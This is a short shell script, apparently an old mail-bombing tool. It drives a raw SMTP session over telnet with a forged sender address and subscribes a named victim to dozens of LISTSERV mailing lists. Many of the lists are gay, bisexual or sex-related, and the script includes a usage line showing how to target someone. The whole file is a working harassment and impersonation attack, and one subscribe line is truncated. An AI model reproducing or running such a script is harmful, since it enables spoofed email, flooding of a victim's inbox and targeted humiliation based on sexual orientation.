#!/bin/sh       
if [ x$4 = x ]; then
echo "Format: $0 Hostname Username Firstname Lastname"
echo "Example: $0 host.com aclam Abdul Clamwhacker"
exit 1
fi
(
sleep 4
echo "helo"
echo "mail from: $2"
echo "rcpt to: LISTSERV@VM1.NODAK.EDU"
echo "data"
sleep 3
echo "subject: Subscription"
echo "register $3 $4"
echo "subscribe TEST $3 $4"
echo "subscribe DIGNITY $3 $4"
echo "subscribe AUGLBC-L $3 $4"
echo "subscribe CLGSG-L $3 $"
echo "subscribe TEST@EARNCC $3 $4"
echo "subscribe TEST@TRITU $3 $4"
echo "subscribe TEST@ICNUCEVM $3 $4"
echo "subscribe TEST@TREARN $3 $4"
echo "subscribe GFULMED $3 $4"
echo "subscribe AAAE $3 $4"
echo "subscribe ACESGLBI $3 $4"
echo "subscribe ACTS $3 $4"
echo "subscribe ADND-L $3 $4"
echo "subscribe GAY-LIBN $3 $4"
echo "subscribe GGALA-L $3 $4"
echo "subscribe GLMGLBCN $3 $4"
echo "subscribe GLQSOC-L $3 $4"
echo "subscribe HRSHMA-L $3 $4"
echo "subscribe LGBPSYCH $3 $4"
echo "subscribe MEDGAY-L $3 $4"
echo "subscribe SEX-L $3 $4"
echo "subscribe SEXADD-L $3 $4"
echo "subscribe SEXTALK $3 $4"
echo "subscribe STOPRAPE $3 $4"
echo "subscribe BIACT-L $3 $4"
echo "subscribe BISEXU-L $3 $4"
echo "."
sleep 2
echo "quit"
) | telnet $1 25
